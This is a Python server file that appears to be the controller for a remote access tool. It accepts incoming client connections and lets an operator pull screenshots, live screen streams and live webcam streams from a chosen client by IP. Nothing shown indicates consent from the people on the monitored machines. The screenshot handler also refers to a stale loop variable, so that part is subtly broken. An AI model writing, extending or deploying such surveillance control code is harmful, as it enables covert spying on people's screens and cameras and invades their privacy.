from socket import AF_INET, socket, SOCK_STREAM
from threading import Thread
from keyboard import read_key
from sys import exit
import cv2
import numpy as np
from vidgear.gears import NetGear
from log import log

HOST = ''
PORT = 33000
BUFSIZ = 1 * 1024 * 1024 # 1 Mb
ADDR = (HOST, PORT)
SERVER = socket(AF_INET, SOCK_STREAM)
SERVER.bind(ADDR)
SEP = "<SEP>"

clients = {}

def update_clients():
    log("[*] Updating clients...")
    log("[#] Connected clients:")
    discn = []
    for client, i in zip(clients, range(len(clients))):
        try:
            send(client, "alive")
        except:
            log("\t" + str(i + 1) + "\t" + "%s:%s" % clients[client] + " (disconnected)")
            discn.append(client)
        else:
            log("\t" + str(i + 1) + "\t" + "%s:%s" % clients[client])
    for clnt in discn:
        del clients[clnt]

def accept_incoming_connections():
    """Sets up handling for incoming clients"""
    while True:
        client, client_address = SERVER.accept()
        log("[+] %s:%s has connected" % client_address)
        clients[client] = client_address

stream_port = 33300

def ask_for_stream(clnt, typ):
    global stream_port
    port = stream_port
    stream_port = 33300 + (stream_port + 1) % 1000
    log(f"[*] Asking for stream on port {port}...")
    send(clnt, f"{typ}{SEP}{port}{SEP}1280{SEP}720")
    return NetGear(receive_mode=True, port=port)

def send(clnt, mes):
    clnt.send(bytes(mes, "utf8"))

def broadcast(mes):
    for client in clients:
        send(client, mes)

if __name__ == '__main__':
    SERVER.listen(5)
    log("[#] Server started on %s:%s" % ADDR)
    log("[#] Waiting for connections...")
    Thread(target=accept_incoming_connections, daemon=True).start()
    while True:
        inp = input().split(" ")

        if inp[0] == "q" or inp[0] == "quit":
            print("[#] Terminating server...")
            exit(0)
        
        elif inp[0] == "c" or inp[0] == "clients":
            update_clients()

        elif inp[0] == "cmd":
            try:
                ip = inp[1]
                clnt = None
                for client in clients:
                    if "%s:%s" % clients[client] == ip:
                        clnt = client
                if clnt == None:
                    print(f"[!] No client with IP {ip} is connected")
                    continue
                cmd = inp[2]
                if cmd == "screenshot":
                    try:
                        send(clnt, "screenshot")
                        log("[*] Receiving screenshot from %s:%s..." % clients[client])
                        size = int(client.recv(BUFSIZ).decode("utf8"))
                        shape = tuple(map(int, client.recv(BUFSIZ).decode("utf8").split(SEP)))
                        total_bytes = 0
                        bytes_read = bytes()
                        while total_bytes < size:
                            bytes_read += clnt.recv(BUFSIZ)
                            total_bytes = len(bytes_read)
                        frame = np.frombuffer(bytes_read, dtype="uint8").reshape(*shape)
                        cv2.imshow("Screenshot", frame)
                        cv2.waitKey(0)
                    except Exception as e:
                        log("[!] Couldn't recieve a screenshot")
                        log(e)
                    else:
                        log("[*] Received a screenshot (success)")
                elif cmd == "screen":
                    try:
                        send(clnt, "screen")
                        client_addr = clients[clnt]
                        log("[*] Screen from %s:%s... (press q to stop)" % client_addr)
                        client = NetGear(receive_mode=True)
                        while True:
                            frame = client.recv()
                            if frame is None:
                                break
                            cv2.imshow("%s:%s screen" % client_addr, frame)
                            if cv2.waitKey(1) == ord("q"):
                                break
                        cv2.destroyWindow("%s:%s screen" % client_addr)
                        client.close()
                    except Exception as e:
                        log("[!] Couldn't get a screen stream")
                        log(e)
                    else:
                        log("[*] Ended stream (success)")
                elif cmd == "camera":
                    try:
                        send(clnt, "camera")
                        client_addr = clients[clnt]
                        log("[*] Camera from %s:%s... (press q to stop)" % client_addr)
                        client = NetGear(receive_mode=True)
                        while True:
                            frame = client.recv()
                            if frame is None:
                                break
                            cv2.imshow("%s:%s camera" % client_addr, frame)
                            if cv2.waitKey(1) == ord("q"):
                                break
                        cv2.destroyWindow("%s:%s camera" % client_addr)
                        client.close()
                    except Exception as e:
                        log("[!] Couldn't get a camera stream")
                        log(e)
                    else:
                        log("[*] Ended stream (success)")
                else:
                    print("[!] Unknown command %s" % cmd)
            except:
                print("[!] Invalid parameters\n[*] Usage: cmd <IP> <CMD>")

        else:
            #broadcast(" ".join(inp))
            print("[!] Unknown command %s" % inp[0])